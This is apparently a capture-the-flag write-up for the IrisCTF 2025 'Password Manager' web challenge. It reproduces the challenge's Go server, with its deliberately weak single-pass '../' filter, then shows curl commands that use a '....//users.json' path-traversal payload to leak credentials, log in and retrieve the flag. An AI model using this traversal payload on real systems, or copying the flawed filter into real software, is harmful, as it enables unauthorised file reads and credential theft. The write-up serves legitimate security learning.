# Password Manager

## Description

It looks like skat finally remembered to use his password manager! One small problem though, he forgot his password to the password manager!

Can you help him log back in so he can get back to his favorite RF forums?

Link: [https://password-manager-web.chal.irisc.tf](https://password-manager-web.chal.irisc.tf)
Source: [password-manager.tar.gz](https://cdn.2025.irisc.tf/password-manager.tar.gz)

By: **User**

## Solution

We have a login form, but no matter what I input it always says `Invalid password!`, probably not even checking for username at all.

![Password Manager.png](/assets/ctf/iris/2025/web/Password Manager.png)

```go
package main

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type CustomMux struct {
	handlers map[string]http.HandlerFunc
}
type Auth struct {
	User     string `json:"usr"`
	Password string `json:"pwd"`
}

var DB *sql.DB
var PathReplacer = strings.NewReplacer(
	"../", "",
)
var users map[string]string

func NewCustomMux() *CustomMux {
	return &CustomMux{handlers: make(map[string]http.HandlerFunc)}
}

func (mux *CustomMux) HandleFunc(pattern string, handler http.HandlerFunc) {
	mux.handlers[pattern] = handler
}

func (mux *CustomMux) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	rawPath := r.URL.RawPath
	if rawPath == "" {
		rawPath = r.URL.Path
	}

	if handler, exists := mux.handlers[rawPath]; exists {
		handler(w, r)
	} else {
		mux.handlers["/"](w, r)
	}
}

func main() {
	// Connect to MySQL
	db, err := sql.Open("mysql", "readonly_user:password@tcp(127.0.0.1:3306)/uwu")
	if err != nil {
		fmt.Printf("Error connecting to mysql: %v\n", err)
		return
	}
	DB = db

	db.SetConnMaxLifetime(time.Minute * 3)
	db.SetMaxOpenConns(10)
	db.SetMaxIdleConns(10)

	// Initialize users var
	file, err := os.Open("./users.json")
	if err != nil {
		fmt.Printf("Error reading users.json: %v\n", err)
		return
	}

	if err := json.NewDecoder(file).Decode(&users); err != nil {
		fmt.Printf("Error reading users.json: %v\n", err)
		return
	}

	// Create HTTP server
	mux := NewCustomMux()

	mux.HandleFunc("/", pages)

	fmt.Println("Server starting on :8000")
	err = http.ListenAndServe(":8000", rawMux(mux))
	if err != nil {
		fmt.Printf("Error starting server: %v\n", err)
	}
}

func rawMux(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		handler.ServeHTTP(w, r)
	})
}

func login(w http.ResponseWriter, r *http.Request) {
	var auth Auth

	if err := json.NewDecoder(r.Body).Decode(&auth); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("Invalid request!"))
		return
	}

	if !validateLogin(auth.User, auth.Password) {
		w.WriteHeader(http.StatusUnauthorized)
		w.Write([]byte("Invalid password!"))
		return
	}

	authJson, err := json.Marshal(auth)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("Error occurred! (this should not happen, please open a ticket!)"))
		return
	}

	http.SetCookie(w, &http.Cookie{
		Name:  "auth",
		Value: base64.RawStdEncoding.EncodeToString(authJson),
	})
	w.Write([]byte("{}"))
}

func validateLogin(user, password string) bool {
	if realpassword, ok := users[user]; !ok || password != realpassword {
		fmt.Printf("%t | \"%s\"==\"%s\" %t", ok, password, realpassword, password == realpassword)
		return false
	}

	return true
}

func isLoggedIn(w http.ResponseWriter, r *http.Request) (bool, error) {
	var auth Auth
	authCookie, err := r.Cookie("auth")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		return false, err
	}

	data, err := base64.RawStdEncoding.DecodeString(authCookie.Value)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		return false, err
	}

	json.Unmarshal(data, &auth)

	return validateLogin(auth.User, auth.Password), nil
}

func getpasswords(w http.ResponseWriter, r *http.Request) {
	loggedIn, err := isLoggedIn(w, r)

	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Println(err)
		return
	}

	if !loggedIn {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	res, err := DB.Exec("SELECT * FROM passwords")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Println(err)
		return
	}

	err = json.NewEncoder(w).Encode(res)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Println(err)
		return
	}
}

func homepage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "./pages/index.html")
}

func notfound(w http.ResponseWriter, _ *http.Request) {
	fmt.Fprintf(w, "Hey! No page found!")
}

func pages(w http.ResponseWriter, r *http.Request) {
	// You. Shall. Not. Path traverse!
	path := PathReplacer.Replace(r.URL.Path)

	if path == "/" {
		homepage(w, r)
		return
	}

	if path == "/login" {
		login(w, r)
		return
	}

	if path == "/getpasswords" {
		getpasswords(w, r)
		return
	}

	fullPath := "./pages" + path

	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		notfound(w, r)
		return
	}

	http.ServeFile(w, r, fullPath)
}
```

There's few vulnerabilities, let's start with path traversal. We can leak `users.json` using `fullPath` variable. It's replacing `../`, but only once hence we can sandwich more path traversal and get proper payload.

```bash
└─$ curl https://password-manager-web.chal.irisc.tf/....//users.json
{
    "skat": "rf=easy-its+just&spicysines123!@"
} 
```

We can now attempt to login and it's a success. But `/login` returns empty response, but we now have a cookie.
```bash
└─$ curl 'https://password-manager-web.chal.irisc.tf/login' --json '{"usr":"skat","pwd":"rf=easy-its+just&spicysines123!@"}' -i
HTTP/2 200
date: Sat, 04 Jan 2025 09:19:00 GMT
content-type: text/plain; charset=utf-8
content-length: 2
set-cookie: auth=eyJ1c3IiOiJza2F0IiwicHdkIjoicmY9ZWFzeS1pdHMranVzdFx1MDAyNnNwaWN5c2luZXMxMjMhQCJ9
strict-transport-security: max-age=31536000; includeSubDomains

{} 
```

`/getpasswords` is only accessible if we are authenticated
```bash
└─$ curl 'https://password-manager-web.chal.irisc.tf/getpasswords' -b 'auth=eyJ1c3IiOiJza2F0IiwicHdkIjoicmY9ZWFzeS1pdHMranVzdFx1MDAyNnNwaWN5c2luZXMxMjMhQCJ9' -s | jq .
[
  {
    "Password": "mypasswordisskat",
    "Title": "Discord",
    "URL": "https://example.com",
    "Username": "skat@skat.skat"
  },
  {
    "Password": "irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}",
    "Title": "RF-Quabber Forum",
    "URL": "https://example.com",
    "Username": "skat"
  },
  {
    "Password": "this-isnt-a-real-password",
    "Title": "Iris CTF",
    "URL": "https://2025.irisc.tf",
    "Username": "skat"
  }
]
```

> Flag: `irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}`

